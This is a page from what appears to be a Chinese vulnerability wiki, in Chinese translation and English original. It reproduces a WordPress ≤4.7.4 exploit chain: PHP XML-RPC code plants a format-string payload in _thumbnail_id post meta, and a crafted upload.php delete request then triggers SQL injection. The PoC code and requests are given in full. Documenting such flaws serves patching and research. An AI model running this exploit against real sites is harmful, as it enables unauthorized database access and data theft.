@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Wordpress%20_%3D%204.7.4%20XML-RPC%20API%20POST%20META%20%E6%9C%AA%E6%A0%A1%E9%AA%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Wordpress \&lt;= 4.7.4 XML-RPC API POST META 未校验漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Wordpress \\\u0026lt;= 4.7.4 XML-RPC API POST META \u672a\u6821\u9a8c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Wordpress%20_%3D%204.8.2%20POST%20META%20%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Wordpress%20_%3D%204.8.2%20POST%20META%20%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Wordpress \&lt;= 4.8.2 POST META 校验绕过漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Wordpress 5.2.4 cors跨域劫持漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="wordpress-474-xml-rpc-api-post-meta">Wordpress \&lt;= 4.7.4 XML-RPC API POST META 未校验漏洞<a class="headerlink" href="#wordpress-474-xml-rpc-api-post-meta" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">中文版<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>以作者身份登录到您的wordpress</p>
+<p>上传图片</p>
+<p>记住图像/媒体的ID</p>
+<p>创建帖子并将图像设置为特色图像（这将创建_thumbnail_id帖子元）</p>
+<p>记住帖子ID</p>
+<p>我们可以通过修改_thumbnail_id的值来编辑的值（6是帖子ID，5是图片/帖子ID）</p>
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="o">$</span><span class="nt">usr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;author&#39;</span><span class="o">;</span>
+<span class="o">$</span><span class="nt">pwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;author&#39;</span><span class="o">;</span>
+<span class="o">$</span><span class="nt">xmlrpc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://local.target/xmlrpc.php&#39;</span><span class="o">;</span>
+<span class="o">$</span><span class="nt">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">new</span><span class="w"> </span><span class="nt">IXR_Client</span><span class="o">($</span><span class="nt">xmlrpc</span><span class="o">);</span>
+<span class="o">$</span><span class="nt">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">array</span><span class="o">(</span><span class="s2">&quot;ID&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">6</span><span class="o">,</span><span class="w"> </span><span class="s1">&#39;meta_input&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">array</span><span class="o">(</span><span class="s2">&quot;_thumbnail_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;xxx&quot;</span><span class="o">));</span>
+<span class="o">$</span><span class="nt">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="nt">client-</span><span class="o">&gt;</span><span class="nt">query</span><span class="o">(</span><span class="s1">&#39;wp.editPost&#39;</span><span class="o">,</span><span class="nt">0</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">usr</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">pwd</span><span class="o">,</span><span class="w"> </span><span class="nt">6</span><span class="c">/*post_id*/</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">content</span><span class="o">);</span>
+</code></pre></div>
+
+<p>通过这段代码，我们在数据库中添加以下负载</p>
+<div class="codehilite"><pre><span></span><code><span class="mf">5</span><span class="w"> </span><span class="err">%</span><span class="mf">1</span><span class="err">$%</span><span class="n">s</span><span class="w"> </span><span class="n">hello</span>
+</code></pre></div>
+
+<p>执行SQL负载</p>
+<p>使用作者帐户登录管理面板，转到媒体，例如</p>
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">upload</span><span class="o">.</span><span class="n">php</span>
+</code></pre></div>
+
+<p>通过_wpnonce参数可以直接进行sql注入</p>
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">upload</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">_wpnonce</span><span class="o">=</span><span class="n">daab7cfabf</span><span class="o">&amp;</span><span class="n">action</span><span class="o">=</span><span class="n">delete</span><span class="o">&amp;</span><span class="n">media</span><span class="o">%</span><span class="mi">5</span><span class="n">B</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">=</span><span class="mi">5</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">251</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">25</span><span class="n">s</span><span class="o">%</span><span class="mi">20</span><span class="n">hello</span>
+</code></pre></div>
+
+<p>其中5 %1$%s
+hello的encode编码是5%20%251%24%25s%20hello这个请求将导致数据库执行以下查询（会有错误）</p>
+<div class="codehilite"><pre><span></span><code>SELECT post_id FROM wp_postmeta WHERE meta_key = &#39;_thumbnail_id&#39; AND meta_value = &#39;5 _thumbnail_id&#39; hello&#39;
+</code></pre></div>
+
+<p>这证明了Wordpress中的sql漏洞，正如5%1$%s之后的前一个post值中提到的，hello就是我们的payload</p>
+<h3 id="_5">英文原文<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>In order to understand the writing here, you need to read the previous
+explanation <a href="https://medium.com/websec/wordpress-sqli-bbb2afcc8e94">https://medium.com/websec/wordpress-sqli-bbb2afcc8e94</a>. If
+you got it, then we can jump to the part and solve the question e.g. how
+to update / insert our sql payload into _thumbnail_id post meta.</p>
+<h4 id="poc-start">PoC start<a class="headerlink" href="#poc-start" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p>Login to your wordpress as author</p>
+</li>
+<li>
+<p>Upload image</p>
+</li>
+<li>
+<p>Remember ID of the image / media</p>
+</li>
+<li>
+<p>Create post and set image as featured image (this creates
+    _thumbnail_id post meta)</p>
+</li>
+<li>
+<p>Remember the post ID</p>
+</li>
+</ul>
+<h4 id="wordpress-474-xml-rpc">Wordpress ≤ 4.7.4 XML-RPC<a class="headerlink" href="#wordpress-474-xml-rpc" title="Permanent link">&para;</a></h4>
+<p>n case of appropriate wordpress version then we can use the third
+vulnerability in this versions of wordpress
+<a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/">https://wordpress.org/news/2017/05/wordpress-4-7-5/</a> e.g.</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">Lack</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">capability</span><span class="w"> </span><span class="nv">checks</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">post</span><span class="w"> </span><span class="nv">meta</span><span class="w"> </span><span class="nv">data</span><span class="w"> </span><span class="nv">in</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">XML</span><span class="o">-</span><span class="nv">RPC</span><span class="w"> </span><span class="nv">API</span>.
+</code></pre></div>
+
+<p>This means that we can edit the value of _thumbnail_id with the
+following code ( 6 is the post ID and 5 is image/post ID )</p>
+<div class="codehilite"><pre><span></span><code><span class="o">$</span><span class="nt">usr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;author&#39;</span><span class="o">;</span>
+<span class="o">$</span><span class="nt">pwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;author&#39;</span><span class="o">;</span>
+<span class="o">$</span><span class="nt">xmlrpc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://local.target/xmlrpc.php&#39;</span><span class="o">;</span>
+<span class="o">$</span><span class="nt">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">new</span><span class="w"> </span><span class="nt">IXR_Client</span><span class="o">($</span><span class="nt">xmlrpc</span><span class="o">);</span>
+<span class="o">$</span><span class="nt">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">array</span><span class="o">(</span><span class="s2">&quot;ID&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">6</span><span class="o">,</span><span class="w"> </span><span class="s1">&#39;meta_input&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">array</span><span class="o">(</span><span class="s2">&quot;_thumbnail_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;5 %1$%s hello&quot;</span><span class="o">));</span>
+<span class="o">$</span><span class="nt">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="nt">client-</span><span class="o">&gt;</span><span class="nt">query</span><span class="o">(</span><span class="s1">&#39;wp.editPost&#39;</span><span class="o">,</span><span class="nt">0</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">usr</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">pwd</span><span class="o">,</span><span class="w"> </span><span class="nt">6</span><span class="c">/*post_id*/</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">content</span><span class="o">);</span>
+</code></pre></div>
+
+<p>and with this code we add the following payload in the DB 5 %1$%s hello</p>
+<h4 id="wordpress-importer-plugin-any-version-of-wordpress">Wordpress importer plugin --- any version of wordpress<a class="headerlink" href="#wordpress-importer-plugin-any-version-of-wordpress" title="Permanent link">&para;</a></h4>
+<p>This is another approach for changing the _thumbnail_id value in the
+database. If wordpress instance have enabled this plugin on it, then
+simple export, change meta value and import will do the job.</p>
+<h4 id="execute-the-sql-payload">Execute the SQL payload<a class="headerlink" href="#execute-the-sql-payload" title="Permanent link">&para;</a></h4>
+<p>Login to the administration panel with your author account, go to media
+e.g. <a href="http://local.target/wp-admin/upload.php">http://local.target/wp-admin/upload.php</a> , grab the _wpnonce
+value and we are ready to prove our SQLi vulnerability. Issue the
+following request towards your local instance:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">local</span><span class="o">.</span><span class="n">target</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">upload</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">_wpnonce</span><span class="o">=</span><span class="n">daab7cfabf</span><span class="o">&amp;</span><span class="n">action</span><span class="o">=</span><span class="n">delete</span><span class="o">&amp;</span><span class="n">media</span><span class="o">%</span><span class="mi">5</span><span class="n">B</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">=</span><span class="mi">5</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">251</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">25</span><span class="n">s</span><span class="o">%</span><span class="mi">20</span><span class="n">hello</span>
+</code></pre></div>
+
+<p>where 5%20%251%24%25s%20hello is url encoded 5 %1$%s hello. This
+request will result with execution of the following query against the DB
+(will rise error of course):</p>
+<div class="codehilite"><pre><span></span><code>SELECT post_id FROM wp_postmeta WHERE meta_key = &#39;_thumbnail_id&#39; AND meta_value = &#39;5 _thumbnail_id&#39; hello&#39;
+</code></pre></div>
+
+<p>This proves the SQLi vulnerability in the wordpress and as mention in
+previous post value after 5 %1$%s e.g. hello is our payload</p>
+<h4 id="is-this-vulnerability-dangerous">Is this vulnerability dangerous?<a class="headerlink" href="#is-this-vulnerability-dangerous" title="Permanent link">&para;</a></h4>
+<p>SQL injection itself is quite dangerous vulnerability, but sometimes
+have its own limitations. Here at our case depending of the database
+server configuration or mysql client used on PHP side could be fatal,
+but in our case best case scenario would be blind sql injection. Sure,
+we all know the trivial attack vector, but here we have 2 facts that go
+against wordpress:</p>
+<p>meta value database column type e.g. size constraint</p>
+<p>media parameter could be POST parameter e.g. will have huge size</p>
+<p>This two facts guide us to the conclusion that even with blind sqli one
+query would be enough to calculate some crucial DB cell value.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Wordpress%20_%3D%204.8.2%20POST%20META%20%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Wordpress%20_%3D%204.8.2%20POST%20META%20%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Wordpress \&lt;= 4.8.2 POST META 校验绕过漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Wordpress%205.2.4%20cors%E8%B7%A8%E5%9F%9F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Wordpress 5.2.4 cors跨域劫持漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
